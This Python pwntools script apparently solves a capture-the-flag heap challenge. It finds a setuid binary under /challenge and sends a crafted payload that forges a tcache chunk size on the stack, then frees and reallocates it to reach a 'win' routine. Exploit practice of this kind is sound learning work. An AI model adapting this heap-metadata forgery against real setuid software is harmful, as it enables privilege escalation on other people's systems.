import sys
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def one_round(io: pwn.process):
    tee(io)

    io.sendline(b"stack_scanf")
    offset_malloc = 0x40  # offset from scanf to next malloc
    io.sendline(
        pwn.flat(
            {
                # tcache_header.size = block_size + size(header)
                offset_malloc - 0x08: 0x70 + 0x10,
            }
        )
    )
    io.sendline(b"stack_free")
    io.sendline(b"stack_malloc_win")
    io.sendline(b"quit")
    io.recvrepeat()


def ctf():
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        one_round(io)


if __name__ == "__main__":
    ctf()
